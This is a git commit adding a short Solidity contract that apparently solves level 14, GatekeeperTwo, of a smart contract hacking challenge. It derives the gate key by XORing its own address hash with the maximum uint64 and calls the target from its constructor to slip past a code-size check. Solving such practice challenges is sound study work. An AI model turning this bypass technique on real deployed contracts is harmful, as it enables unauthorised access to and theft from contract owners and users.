2350569be426f418c083bf348e99ba9790e227bf
dimalavrenuk <105659427+dimalavrenuk@users.noreply.github.com>
2026-01-18 16:00:33 +0200

    Update 14 - attackGatekeeperTwo.sol

--- src/14 - attackGatekeeperTwo.sol
+++ src/14 - attackGatekeeperTwo.sol
@@ -1,1 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+interface GatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract attackGatekeeperTwo {
+    constructor(address _target) {
+        uint64 A = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+        
+        uint64 C = type(uint64).max;
+        
+        uint64 B = C ^ A;
+        
+        bytes8 key = bytes8(B);
+        
+        GatekeeperTwo(_target).enter(key);
+    }
+}
